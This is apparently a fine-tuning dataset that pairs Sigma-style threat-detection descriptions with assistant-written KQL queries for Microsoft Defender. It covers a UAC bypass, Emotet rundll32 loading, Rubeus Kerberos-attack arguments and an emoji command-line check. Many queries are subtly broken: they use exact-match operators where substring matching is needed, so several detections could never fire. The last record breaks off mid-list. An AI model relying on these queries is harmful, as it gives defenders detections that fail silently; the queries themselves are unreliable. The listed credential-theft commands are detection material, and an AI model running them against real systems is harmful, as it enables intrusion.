{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) Topic: proc_creation_win_uac_bypass_ntfs_reparse_point"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"\\\\AppData\\\\Local\\\\Temp\\\\update.msu\" and ProcessCommandLine startswith \"\\\"C:\\\\Windows\\\\system32\\\\wusa.exe\\\"  /quiet C:\\\\Users\\\\\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))) or ((InitiatingProcessIntegrityLevel in~ (\"High\", \"System\")) and InitiatingProcessCommandLine =~ \"\\\"C:\\\\Windows\\\\system32\\\\dism.exe\\\" /online /quiet /norestart /add-package /packagepath:\\\"C:\\\\Windows\\\\system32\\\\pe386\\\" /ignorecheck\" and (ProcessCommandLine in~ (\"C:\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\dismhost.exe {\")) and InitiatingProcessFolderPath =~ \"\\\\DismHost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects encoded base64 MZ header in the commandline Topic: proc_creation_win_susp_inline_base64_mz_header"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"TVqQAAMAAAAEAAAA\", \"TVpQAAIAAAAEAA8A\", \"TVqAAAEAAAAEABAA\", \"TVoAAAAAAAAAAAAA\", \"TVpTAQEAAAAEAAAA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects additions to the Emond Launch Daemon that adversaries may use to gain persistence and elevate privileges. Topic: file_event_macos_emond_launch_daemon"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".plist\", \"/private/var/db/emondClients/\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed) Topic: file_event_win_winrm_awl_bypass"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"WsmPty.xsl\", \"WsmTxt.xsl\")) and (not((FileName in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential EmpireMonkey APT activity Topic: proc_creation_win_apt_empiremonkey"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"/e:jscript\", \"\\\\Local\\\\Temp\\\\Errors.bat\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file with a non-\".rsp\" extension. Topic: proc_creation_win_odbcconf_response_file_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \" -f \" or ProcessCommandLine contains \" /f \" or ProcessCommandLine contains \" \u2013f \" or ProcessCommandLine contains \" \u2014f \" or ProcessCommandLine contains \" \u2015f \") and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")) and (not((ProcessCommandLine =~ \".rsp\" or (FolderPath =~ \"C:\\\\Windows\\\\System32\\\\odbcconf.exe\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\runonce.exe\" and ProcessCommandLine =~ \".exe /E /F \\\"C:\\\\WINDOWS\\\\system32\\\\odbcconf.tmp\\\"\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command. Topic: proc_creation_win_iis_connection_strings_decryption"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"connectionStrings\", \" -pdf\")) and (FolderPath endswith \"\\\\aspnet_regiis.exe\" or ProcessVersionInfoOriginalFileName =~ \"aspnet_regiis.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task. This technique is used by Tarrask malware Topic: registry_delete_schtasks_hide_task_via_sd_value_removal"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType in~ (\"RegistryKeyDeleted\", \"RegistryValueDeleted\")) and (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree*\" and RegistryKey contains \"SD\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL Topic: proc_creation_win_malware_emotet_rundll32_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine endswith \",RunDLL\" or ProcessCommandLine endswith \",Control_RunDLL\") and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")) and (not((InitiatingProcessFileName =~ \"\\\\tracker.exe\" or (ProcessCommandLine endswith \".dll,Control_RunDLL\" or ProcessCommandLine endswith \".dll\\\",Control_RunDLL\" or ProcessCommandLine endswith \".dll',Control_RunDLL\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the hacktool Rubeus via PE information of command line parameters Topic: proc_creation_win_hktl_rubeus"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\Rubeus.exe\" or ProcessVersionInfoOriginalFileName =~ \"Rubeus.exe\" or ProcessVersionInfoFileDescription =~ \"Rubeus\" or (ProcessCommandLine contains \"asreproast \" or ProcessCommandLine contains \"dump /service:krbtgt \" or ProcessCommandLine contains \"dump /luid:0x\" or ProcessCommandLine contains \"kerberoast \" or ProcessCommandLine contains \"createnetonly /program:\" or ProcessCommandLine contains \"ptt /ticket:\" or ProcessCommandLine contains \"/impersonateuser:\" or ProcessCommandLine contains \"renew /ticket:\" or ProcessCommandLine contains \"asktgt /user:\" or ProcessCommandLine contains \"harvest /interval:\" or ProcessCommandLine contains \"s4u /user:\" or ProcessCommandLine contains \"s4u /ticket:\" or ProcessCommandLine contains \"hash /password:\" or ProcessCommandLine contains \"golden /aes256:\" or ProcessCommandLine contains \"silver /user:\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action. Topic: proc_creation_win_odbcconf_response_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -f \" or ProcessCommandLine contains \" /f \" or ProcessCommandLine contains \" \u2013f \" or ProcessCommandLine contains \" \u2014f \" or ProcessCommandLine contains \" \u2015f \") and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\") and ProcessCommandLine =~ \".rsp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript Topic: proc_creation_win_bginfo_suspicious_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\notepad.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (FolderPath contains \"\\\\AppData\\\\Local\\\\\" or FolderPath contains \"\\\\AppData\\\\Roaming\\\\\" or FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \":\\\\Temp\\\\\" or FolderPath contains \":\\\\Windows\\\\Temp\\\\\" or FolderPath contains \":\\\\PerfLogs\\\\\")) and (InitiatingProcessFileName in~ (\"\\\\bginfo.exe\", \"\\\\bginfo64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity. Topic: proc_creation_win_susp_emoji_usage_in_cli_3"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\ud83e\udd86\", \"\ud83e\udd85\", \"\ud83e\udd89\", \"\ud83e\udd87\", \"\ud83d\udc3a\", \"\ud83d\udc17\", \"\ud83d\udc34\", \"\ud83e\udd84\", \"\ud83d\udc1d\", \"\ud83e\udeb1\", \"\ud83d\udc1b\", \"\ud83e\udd8b\", \"\ud83d\udc0c\", \"\ud83d\udc1e\", \"\ud83d\udc1c\", \"\ud83e\udeb0\", \"\ud83e\udeb2\", \"\ud83e\udeb3\", \"\ud83e\udd9f\", \"\ud83e\udd97\", \"\ud83d\udd77\", \"\ud83d\udd78\", \"\ud83e\udd82\", \"\ud83d\udc22\", \"\ud83d\udc0d\", \"\ud83e\udd8e\", \"\ud83e\udd96\", \"\ud83e\udd95\", \"\ud83d\udc19\", \"\ud83e\udd91\", \"\ud83e\udd90\", \"\ud83e\udd9e\", \"\ud83e\udd80\", \"\ud83e\udeb8\", \"\ud83d\udc21\", \"\ud83d\udc20\", \"\ud83d\udc1f\", \"\ud83d\udc2c\", \"\ud83d\udc33\", \"\ud83d\udc0b\", \"\ud83e\udd88\", \"\ud83d\udc0a\", \"\ud83d\udc05\", \"\ud83d\udc06\", \"\ud83e\udd93\", \"\ud83e\udd8d\", \"\ud83e\udda7\", \"\ud83e\udda3\", \"\ud83d\udc18\", \"\ud83e\udd9b\", \"\ud83e\udd8f\", \"\ud83d\udc2a\", \"\ud83d\udc2b\", \"\ud83e\udd92\", \"\ud83e\udd98\", \"\ud83e\uddac\", \"\ud83d\udc03\", \"\ud83d\udc02\", \"\ud83d\udc04\", \"\ud83d\udc0e\", \"\ud83d\udc16\", \"\ud83d\udc0f\", \"\ud83d\udc11\", \"\ud83e\udd99\", \"\ud83d\udc10\", \"\ud83e\udd8c\", \"\ud83d\udc15\", \"\ud83d\udc29\", \"\ud83e\uddae\", \"\ud83d\udc15\u200d\ud83e\uddba\", \"\ud83d\udc08\", \"\ud83d\udc08\u200d\u2b1b\", \"\ud83e\udeb6\", \"\ud83d\udc13\", \"\ud83e\udd83\", \"\ud83e\udda4\", \"\ud83e\udd9a\", \"\ud83e\udd9c\", \"\ud83e\udda2\", \"\ud83e\udda9\", \"\ud83d\udd4a\", \"\ud83d\udc07\", \"\ud83e\udd9d\", \"\ud83e\udda8\", \"\ud83e\udda1\", \"\ud83e\uddab\", \"\ud83e\udda6\", \"\ud83e\udda5\", \"\ud83d\udc01\", \"\ud83d\udc00\", \"\ud83d\udc3f\", \"\ud83e\udd94\", \"\ud83d\udc3e\", \"\ud83d\udc09\", \"\ud83d\udc32\", \"\ud83c\udf35\", \"\ud83c\udf84\", \"\ud83c\udf32\", \"\ud83c\udf33\", \"\ud83c\udf34\", \"\ud83e\udeb9\", \"\ud83e\udeba\", \"\ud83e\udeb5\", \"\ud83c\udf31\", \"\ud83c\udf3f\", \"\u2618\ufe0f\", \"\ud83c\udf40\", \"\ud83c\udf8d\", \"\ud83e\udeb4\", \"\ud83c\udf8b\", \"\ud83c\udf43\", \"\ud83c\udf42\", \"\ud83c\udf41\", \"\ud83c\udf44\", \"\ud83d\udc1a\", \"\ud83e\udea8\", \"\ud83c\udf3e\", \"\ud83d\udc90\", \"\ud83c\udf37\", \"\ud83e\udeb7\", \"\ud83c\udf39\", \"\ud83e\udd40\", \"\ud83c\udf3a\", \"\ud83c\udf38\", \"\ud83c\udf3c\", \"\ud83c\udf3b\", \"\ud83c\udf1e\", \"\ud83c\udf1d\", \"\ud83c\udf1b\", \"\ud83c\udf1c\", \"\ud83c\udf1a\", \"\ud83c\udf15\", \"\ud83c\udf16\", \"\ud83c\udf17\", \"\ud83c\udf18\", \"\ud83c\udf11\", \"\ud83c\udf12\", \"\ud83c\udf13\", \"\ud83c\udf14\", \"\ud83c\udf19\", \"\ud83c\udf0e\", \"\ud83c\udf0d\", \"\ud83c\udf0f\", \"\ud83e\ude90\", \"\ud83d\udcab\", \"\u2b50\ufe0f\", \"\ud83c\udf1f\", \"\u2728\", \"\u26a1\ufe0f\", \"\u2604\ufe0f\", \"\ud83d\udca5\", \"\ud83d\udd25\", \"\ud83c\udf2a\", \"\ud83c\udf08\", \"\u2600\ufe0f\", \"\ud83c\udf24\", \"\u26c5\ufe0f\", \"\ud83c\udf25\", \"\u2601\ufe0f\", \"\ud83c\udf26\", \"\ud83c\udf27\", \"\u26c8\", \"\ud83c\udf29\", \"\ud83c\udf28\", \"\u2744\ufe0f\", \"\u2603\ufe0f\", \"\u26c4\ufe0f\", \"\ud83c\udf2c\", \"\ud83d\udca8\", \"\ud83d\udca7\", \"\ud83d\udca6\", \"\ud83e\udee7\", \"\u2614\ufe0f\", \"\u2602\ufe0f\", \"\ud83c\udf0a\", \"\ud83c\udf2b\ud83c\udf4f\", \"\ud83c\udf4e\", \"\ud83c\udf50\", \"\ud83c\udf4a\", \"\ud83c\udf4b\", \"\ud83c\udf4c\", \"\ud83c\udf49\", \"\ud83c\udf47\", \"\ud83c\udf53\", \"\ud83e\uded0\", \"\ud83c\udf48\", \"\ud83c\udf52\", \"\ud83c\udf51\", \"\ud83e\udd6d\", \"\ud83c\udf4d\", \"\ud83e\udd65\", \"\ud83e\udd5d\", \"\ud83c\udf45\", \"\ud83c\udf46\", \"\ud83e\udd51\", \"\ud83e\udd66\", \"\ud83e\udd6c\", \"\ud83e\udd52\", \"\ud83c\udf36\", \"\ud83e\uded1\", \"\ud83c\udf3d\", \"\ud83e\udd55\", \"\ud83e\uded2\", \"\ud83e\uddc4\", \"\ud83e\uddc5\", \"\ud83e\udd54\", \"\ud83c\udf60\", \"\ud83e\uded8\", \"\ud83e\udd50\", \"\ud83e\udd6f\", \"\ud83c\udf5e\", \"\ud83e\udd56\", \"\ud83e\udd68\", \"\ud83e\uddc0\", \"\ud83e\udd5a\", \"\ud83c\udf73\", \"\ud83e\uddc8\", \"\ud83e\udd5e\", \"\ud83e\uddc7\", \"\ud83e\udd53\", \"\ud83e\udd69\", \"\ud83c\udf57\", \"\ud83c\udf56\", \"\ud83e\uddb4\", \"\ud83c\udf2d\", \"\ud83c\udf54\", \"\ud83c\udf5f\", \"\ud83c\udf55\", \"\ud83e\uded3\", \"\ud83e\udd6a\", \"\ud83e\udd59\", \"\ud83e\uddc6\", \"\ud83c\udf2e\", \"\ud83c\udf2f\", \"\ud83e\uded4\", \"\ud83e\udd57\", \"\ud83e\udd58\", \"\ud83e\uded5\", \"\ud83e\udd6b\", \"\ud83c\udf5d\", \"\ud83c\udf5c\", \"\ud83c\udf72\", \"\ud83c\udf5b\", \"\ud83c\udf63\", \"\ud83c\udf71\", \"\ud83e\udd5f\", \"\ud83e\uddaa\", \"\ud83c\udf64\", \"\ud83c\udf59\", \"\ud83c\udf5a\", \"\ud83c\udf58\", \"\ud83c\udf65\", \"\ud83e\udd60\", \"\ud83e\udd6e\", \"\ud83c\udf62\", \"\ud83c\udf61\", \"\ud83c\udf67\", \"\ud83c\udf68\", \"\ud83c\udf66\", \"\ud83e\udd67\", \"\ud83e\uddc1\", \"\ud83c\udf70\", \"\ud83c\udf82\", \"\ud83c\udf6e\", \"\ud83c\udf6d\", \"\ud83c\udf6c\", \"\ud83c\udf6b\", \"\ud83c\udf7f\", \"\ud83c\udf69\", \"\ud83c\udf6a\", \"\ud83c\udf30\", \"\ud83e\udd5c\", \"\ud83c\udf6f\", \"\ud83e\udd5b\", \"\ud83c\udf7c\", \"\ud83e\uded6\", \"\u2615\ufe0f\", \"\ud83c\udf75\", \"\ud83e\uddc3\", \"\ud83e\udd64\", \"\ud83e\uddcb\", \"\ud83e\uded9\", \"\ud83c\udf76\", \"\ud83c\udf7a\", \"\ud83c\udf7b\", \"\ud83e\udd42\", \"\ud83c\udf77\", \"\ud83e\uded7\", \"\ud83e\udd43\", \"\ud83c\udf78\", \"\ud83c\udf79\", \"\ud83e\uddc9\", \"\ud83c\udf7e\", \"\ud83e\uddca\", \"\ud83e\udd44\", \"\ud83c\udf74\", \"\ud83c\udf7d\", \"\ud83e\udd63\", \"\ud83e\udd61\", \"\ud83e\udd62\", \"\ud83e\uddc2\", \"\u26bd\ufe0f\", \"\ud83c\udfc0\", \"\ud83c\udfc8\", \"\u26be\ufe0f\", \"\ud83e\udd4e\", \"\ud83c\udfbe\", \"\ud83c\udfd0\", \"\ud83c\udfc9\", \"\ud83e\udd4f\", \"\ud83c\udfb1\", \"\ud83e\ude80\", \"\ud83c\udfd3\", \"\ud83c\udff8\", \"\ud83c\udfd2\", \"\ud83c\udfd1\", \"\ud83e\udd4d\", \"\ud83c\udfcf\", \"\ud83e\ude83\", \"\ud83e\udd45\", \"\u26f3\ufe0f\", \"\ud83e\ude81\", \"\ud83c\udff9\", \"\ud83c\udfa3\", \"\ud83e\udd3f\", \"\ud83e\udd4a\", \"\ud83e\udd4b\", \"\ud83c\udfbd\", \"\ud83d\udef9\", \"\ud83d\udefc\", \"\ud83d\udef7\", \"\u26f8\", \"\ud83e\udd4c\", \"\ud83c\udfbf\", \"\u26f7\", \"\ud83c\udfc2\", \"\ud83e\ude82\", \"\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ufe0f\", \"\ud83c\udfcb\ufe0f\u200d\u2642\ufe0f\", \"\ud83e\udd3c\u200d\u2640\ufe0f\", \"\ud83e\udd3c\", \"\ud83e\udd3c\u200d\u2642\ufe0f\", \"\ud83e\udd38\u200d\u2640\ufe0f\", \"\ud83e\udd38\", \"\ud83e\udd38\u200d\u2642\ufe0f\", \"\u26f9\ufe0f\u200d\u2640\ufe0f\", \"\u26f9\ufe0f\", \"\u26f9\ufe0f\u200d\u2642\ufe0f\", \"\ud83e\udd3a\", \"\ud83e\udd3e\u200d\u2640\ufe0f\", \"\ud83e\udd3e\", \"\ud83e\udd3e\u200d\u2642\ufe0f\", \"\ud83c\udfcc\ufe0f\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ufe0f\", \"\ud83c\udfcc\ufe0f\u200d\u2642\ufe0f\", \"\ud83c\udfc7\", \"\ud83e\uddd8\u200d\u2640\ufe0f\", \"\ud83e\uddd8\", \"\ud83e\uddd8\u200d\u2642\ufe0f\", \"\ud83c\udfc4\u200d\u2640\ufe0f\", \"\ud83c\udfc4\", \"\ud83c\udfc4\u200d\u2642\ufe0f\", \"\ud83c\udfca\u200d\u2640\ufe0f\", \"\ud83c\udfca\", \"\ud83c\udfca\u200d\u2642\ufe0f\", \"\ud83e\udd3d\u200d\u2640\ufe0f\", \"\ud83e\udd3d\", \"\ud83e\udd3d\u200d\u2642\ufe0f\", \"\ud83d\udea3\u200d\u2640\ufe0f\", \"\ud83d\udea3\", \"\ud83d\udea3\u200d\u2642\ufe0f\", \"\ud83e\uddd7\u200d\u2640\ufe0f\", \"\ud83e\uddd7\", \"\ud83e\uddd7\u200d\u2642\ufe0f\", \"\ud83d\udeb5\u200d\u2640\ufe0f\", \"\ud83d\udeb5\", \"\ud83d\udeb5\u200d\u2642\ufe0f\", \"\ud83d\udeb4\u200d\u2640\ufe0f\", \"\ud83d\udeb4\", \"\ud83d\udeb4\u200d\u2642\ufe0f\", \"\ud83c\udfc6\", \"\ud83e\udd47\", \"\ud83e\udd48\", \"\ud83e\udd49\", \"\ud83c\udfc5\", \"\ud83c\udf96\", \"\ud83c\udff5\", \"\ud83c\udf97\", \"\ud83c\udfab\", \"\ud83c\udf9f\", \"\ud83c\udfaa\", \"\ud83e\udd39\", \"\ud83e\udd39\u200d\u2642\ufe0f\", \"\ud83e\udd39\u200d\u2640\ufe0f\", \"\ud83c\udfad\", \"\ud83e\ude70\", \"\ud83c\udfa8\", \"\ud83c\udfac\", \"\ud83c\udfa4\", \"\ud83c\udfa7\", \"\ud83c\udfbc\", \"\ud83c\udfb9\", \"\ud83e\udd41\", \"\ud83e\ude98\", \"\ud83c\udfb7\", \"\ud83c\udfba\", \"\ud83e\ude97\", \"\ud83c\udfb8\", \"\ud83e\ude95\", \"\ud83c\udfbb\", \"\ud83c\udfb2\", \"\u265f\", \"\ud83c\udfaf\", \"\ud83c\udfb3\", \"\ud83c\udfae\", \"\ud83c\udfb0\", \"\ud83e\udde9\", \"\ud83d\ude97\", \"\ud83d\ude95\", \"\ud83d\ude99\", \"\ud83d\ude8c\", \"\ud83d\ude8e\", \"\ud83c\udfce\", \"\ud83d\ude93\", \"\ud83d\ude91\", \"\ud83d\ude92\", \"\ud83d\ude90\", \"\ud83d\udefb\", \"\ud83d\ude9a\", \"\ud83d\ude9b\", \"\ud83d\ude9c\", \"\ud83e\uddaf\", \"\ud83e\uddbd\", \"\ud83e\uddbc\", \"\ud83d\udef4\", \"\ud83d\udeb2\", \"\ud83d\udef5\", \"\ud83c\udfcd\", \"\ud83d\udefa\", \"\ud83d\udea8\", \"\ud83d\ude94\", \"\ud83d\ude8d\", \"\ud83d\ude98\", \"\ud83d\ude96\", \"\ud83d\udede\", \"\ud83d\udea1\", \"\ud83d\udea0\", \"\ud83d\ude9f\", \"\ud83d\ude83\", \"\ud83d\ude8b\", \"\ud83d\ude9e\", \"\ud83d\ude9d\", \"\ud83d\ude84\", \"\ud83d\ude85\", \"\ud83d\ude88\", \"\ud83d\ude82\", \"\ud83d\ude86\", \"\ud83d\ude87\", \"\ud83d\ude8a\", \"\ud83d\ude89\", \"\u2708\ufe0f\", \"\ud83d\udeeb\", \"\ud83d\udeec\", \"\ud83d\udee9\", \"\ud83d\udcba\", \"\ud83d\udef0\", \"\ud83d\ude80\", \"\ud83d\udef8\", \"\ud83d\ude81\", \"\ud83d\udef6\", \"\u26f5\ufe0f\", \"\ud83d\udea4\", \"\ud83d\udee5\", \"\ud83d\udef3\", \"\u26f4\", \"\ud83d\udea2\", \"\u2693\ufe0f\", \"\ud83d\udedf\", \"\ud83e\ude9d\", \"\u26fd\ufe0f\", \"\ud83d\udea7\", \"\ud83d\udea6\", \"\ud83d\udea5\", \"\ud83d\ude8f\", \"\ud83d\uddfa\", \"\ud83d\uddff\", \"\ud83d\uddfd\", \"\ud83d\uddfc\", \"\ud83c\udff0\", \"\ud83c\udfef\", \"\ud83c\udfdf\", \"\ud83c\udfa1\", \"\ud83c\udfa2\", \"\ud83d\udedd\", \"\ud83c\udfa0\", \"\u26f2\ufe0f\", \"\u26f1\", \"\ud83c\udfd6\", \"\ud83c\udfdd\", \"\ud83c\udfdc\", \"\ud83c\udf0b\", \"\u26f0\", \"\ud83c\udfd4\", \"\ud83d\uddfb\", \"\ud83c\udfd5\", \"\u26fa\ufe0f\", \"\ud83d\uded6\", \"\ud83c\udfe0\", \"\ud83c\udfe1\", \"\ud83c\udfd8\", \"\ud83c\udfda\", \"\ud83c\udfd7\", \"\ud83c\udfed\", \"\ud83c\udfe2\", \"\ud83c\udfec\", \"\ud83c\udfe3\", \"\ud83c\udfe4\", \"\ud83c\udfe5\", \"\ud83c\udfe6\", \"\ud83c\udfe8\", \"\ud83c\udfea\", \"\ud83c\udfeb\", \"\ud83c\udfe9\", \"\ud83d\udc92\", \"\ud83c\udfdb\", \"\u26ea\ufe0f\", \"\ud83d\udd4c\", \"\ud83d\udd4d\", \"\ud83d\uded5\", \"\ud83d\udd4b\", \"\u26e9\", \"\ud83d\udee4\", \"\ud83d\udee3\", \"\ud83d\uddfe\", \"\ud83c\udf91\", \"\ud83c\udfde\", \"\ud83c\udf05\", \"\ud83c\udf04\", \"\ud83c\udf20\", \"\ud83c\udf87\", \"\ud83c\udf86\", \"\ud83c\udf07\", \"\ud83c\udf06\", \"\ud83c\udfd9\", \"\ud83c\udf03\", \"\ud83c\udf0c\", \"\ud83c\udf09\", \"\ud83c\udf01\", \"\u231a\ufe0f\", \"\ud83d\udcf1\", \"\ud83d\udcf2\", \"\ud83d\udcbb\", \"\u2328\ufe0f\", \"\ud83d\udda5\", \"\ud83d\udda8\", \"\ud83d\uddb1\", \"\ud83d\uddb2\", \"\ud83d\udd79\", \"\ud83d\udddc\", \"\ud83d\udcbd\", \"\ud83d\udcbe\", \"\ud83d\udcbf\", \"\ud83d\udcc0\", \"\ud83d\udcfc\", \"\ud83d\udcf7\", \"\ud83d\udcf8\", \"\ud83d\udcf9\", \"\ud83c\udfa5\", \"\ud83d\udcfd\", \"\ud83c\udf9e\", \"\ud83d\udcde\", \"\u260e\ufe0f\", \"\ud83d\udcdf\", \"\ud83d\udce0\", \"\ud83d\udcfa\", \"\ud83d\udcfb\", \"\ud83c\udf99\", \"\ud83c\udf9a\", \"\ud83c\udf9b\", \"\ud83e\udded\", \"\u23f1\", \"\u23f2\", \"\u23f0\", \"\ud83d\udd70\", \"\u231b\ufe0f\", \"\u23f3\", \"\ud83d\udce1\", \"\ud83d\udd0b\", \"\ud83e\udeab\", \"\ud83d\udd0c\", \"\ud83d\udca1\", \"\ud83d\udd26\", \"\ud83d\udd6f\", \"\ud83e\ude94\", \"\ud83e\uddef\", \"\ud83d\udee2\", \"\ud83d\udcb8\", \"\ud83d\udcb5\", \"\ud83d\udcb4\", \"\ud83d\udcb6\", \"\ud83d\udcb7\", \"\ud83e\ude99\", \"\ud83d\udcb0\", \"\ud83d\udcb3\", \"\ud83d\udc8e\", \"\u2696\ufe0f\", \"\ud83e\ude9c\", \"\ud83e\uddf0\", \"\ud83e\ude9b\", \"\ud83d\udd27\", \"\ud83d\udd28\", \"\u2692\", \"\ud83d\udee0\", \"\u26cf\", \"\ud83e\ude9a\", \"\ud83d\udd29\", \"\u2699\ufe0f\", \"\ud83e\udea4\", \"\ud83e\uddf1\", \"\u26d3\", \"\ud83e\uddf2\", \"\ud83d\udd2b\", \"\ud83d\udca3\", \"\ud83e\udde8\", \"\ud83e\ude93\", \"\ud83d\udd2a\", \"\ud83d\udde1\", \"\u2694\ufe0f\", \"\ud83d\udee1\", \"\ud83d\udeac\", \"\u26b0\ufe0f\", \"\ud83e\udea6\", \"\u26b1\ufe0f\", \"\ud83c\udffa\", \"\ud83d\udd2e\", \"\ud83d\udcff\", \"\ud83e\uddff\", \"\ud83e\udeac\", \"\ud83d\udc88\", \"\u2697\ufe0f\", \"\ud83d\udd2d\", \"\ud83d\udd2c\", \"\ud83d\udd73\", \"\ud83e\ude79\", \"\ud83e\ude7a\", \"\ud83e\ude7b\", \"\ud83e\ude7c\", \"\ud83d\udc8a\", \"\ud83d\udc89\", \"\ud83e\ude78\", \"\ud83e\uddec\", \"\ud83e\udda0\", \"\ud83e\uddeb\", \"\ud83e\uddea\", \"\ud83c\udf21\", \"\ud83e\uddf9\", \"\ud83e\udea0\", \"\ud83e\uddfa\", \"\ud83e\uddfb\", \"\ud83d\udebd\", \"\ud83d\udeb0\", \"\ud83d\udebf\", \"\ud83d\udec1\", \"\ud83d\udec0\", \"\ud83e\uddfc\", \"\ud83e\udea5\", \"\ud83e\ude92\", \"\ud83e\uddfd\", \"\ud83e\udea3\", \"\ud83e\uddf4\", \"\ud83d\udece\", \"\ud83d\udd11\", \"\ud83d\udddd\", \"\ud83d\udeaa\", \"\ud83e\ude91\", \"\ud83d\udecb\", \"\ud83d\udecf\", \"\ud83d\udecc\", \"\ud83e\uddf8\", \"\ud83e\ude86\", \"\ud83d\uddbc\", \"\ud83e\ude9e\", \"\ud83e\ude9f\", \"\ud83d\udecd\", \"\ud83d\uded2\", \"\ud83c\udf81\", \"\ud83c\udf88\", \"\ud83c\udf8f\", \"\ud83c\udf80\", \"\ud83e\ude84\", \"\ud83e\ude85\", \"\ud83c\udf8a\", \"\ud83c\udf89\", \"\ud83e\udea9\", \"\ud83c\udf8e\", \"\ud83c\udfee\", \"\ud83c\udf90\", \"\ud83e\udde7\", \"\u2709\ufe0f\", \"\ud83d\udce9\", \"\ud83d\udce8\", \"\ud83d\udce7\", \"\ud83d\udc8c\", \"\ud83d\udce5\", \"\ud83d\udce4\", \"\ud83d\udce6\", \"\ud83c\udff7\", \"\ud83e\udea7\", \"\ud83d\udcea\", \"\ud83d\udceb\", \"\ud83d\udcec\", \"\ud83d\udced\", \"\ud83d\udcee\", \"\ud83d\udcef\", \"\ud83d\udcdc\", \"\ud83d\udcc3\", \"\ud83d\udcc4\", \"\ud83d\udcd1\", \"\ud83e\uddfe\", \"\ud83d\udcca\", \"\ud83d\udcc8\", \"\ud83d\udcc9\", \"\ud83d\uddd2\", \"\ud83d\uddd3\", \"\ud83d\udcc6\", \"\ud83d\udcc5\", 